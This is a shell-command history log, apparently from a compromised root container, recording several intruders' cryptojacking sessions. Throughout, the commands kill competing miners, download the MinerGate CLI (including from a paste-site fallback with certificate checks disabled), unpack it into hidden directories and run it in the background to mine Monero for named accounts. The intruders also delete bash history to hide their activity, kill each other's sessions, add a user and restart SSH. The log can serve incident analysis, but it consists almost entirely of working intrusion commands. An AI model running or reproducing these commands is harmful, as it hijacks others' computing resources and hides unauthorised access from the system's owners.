+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 12:05 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 12:05 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 12:05 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 12:05 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 12:05 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 12:37 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+kill -9 988;  ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 12:42 /notebooks
+kill -9 863;  ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20170101 12:43 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 13:11 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 13:11 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 13:11 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 13:11 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 13:11 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 13:45 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 14:20 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 14:54 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 15:29 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 16:06 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 16:43 /notebooks
+kill -9 1703;  ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 16:44 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 16:44 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 16:44 /root
+kill -9 1241;  ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /notebooks
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 16:44 /root/.ttmp/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 16:44 /root/.ttmp/opt/minergate-cli
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20170101 16:44 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 18:36 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 18:36 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 18:36 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /notebooks
+kill -9 1906;  ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20170101 18:37 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 19:26 /notebooks
+netstat -nl ### root@f5e57551b879 /dev/pts/0 20170101 19:26 /notebooks
+service ssh restart ### root@f5e57551b879 /dev/pts/0 20170101 19:26 /notebooks
+netstat -nl ### root@f5e57551b879 /dev/pts/0 20170101 19:26 /notebooks
+userdell well ### root@f5e57551b879 /dev/pts/0 20170101 19:28 /notebooks
+userdel well ### root@f5e57551b879 /dev/pts/0 20170101 19:29 /notebooks
+adduser well ### root@f5e57551b879 /dev/pts/0 20170101 19:29 /notebooks
+cd ~/.ssh/ ### root@f5e57551b879 /dev/pts/0 20170101 19:30 /notebooks -> /root/.ssh
+ls ### root@f5e57551b879 /dev/pts/0 20170101 19:30 /root/.ssh
+nano known_hosts ### root@f5e57551b879 /dev/pts/0 20170101 19:30 /root/.ssh
+cd ~/.ssh/known_hosts ### root@f5e57551b879 /dev/pts/0 20170101 19:30 /notebooks -> /root/.ssh
+nano known_hosts ### root@f5e57551b879 /dev/pts/0 20170101 19:30 /root/.ssh
+apt-get install nano ### root@f5e57551b879 /dev/pts/0 20170101 19:31 /root/.ssh
+speedtest --share ### root@f5e57551b879 /dev/pts/0 20170101 19:31 /root/.ssh
+speedtest --share ### root@f5e57551b879 /dev/pts/0 20170101 19:32 /root/.ssh
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 19:47 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/1 20170101 19:47 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/1 20170101 19:47 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/1 20170101 19:47 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/1 20170101 19:47 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/1 20170101 20:23 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/1 20170101 20:23 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/1 20170101 20:23 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/1 20170101 20:23 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 20:23 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/1 20170101 20:23 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/1 20170101 20:23 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/1 20170101 20:24 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/1 20170101 20:24 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+kill -9 3001;  ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/1' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20170101 20:26 /notebooks
+speedtest --share ### @f5e57551b879 not a tty 20170102 07:29 /notebooks
+ls ### @f5e57551b879 not a tty 20170102 07:29 /notebooks
+cd ../ ### @f5e57551b879 not a tty 20170102 07:29 /notebooks -> /
+cd datamnt/github/ ### @f5e57551b879 not a tty 20170102 07:29 / -> /datamnt/github
+docker ps ### @f5e57551b879 not a tty 20170102 07:29 /datamnt/github
+docker ps -a ### @f5e57551b879 not a tty 20170102 07:30 /datamnt/github
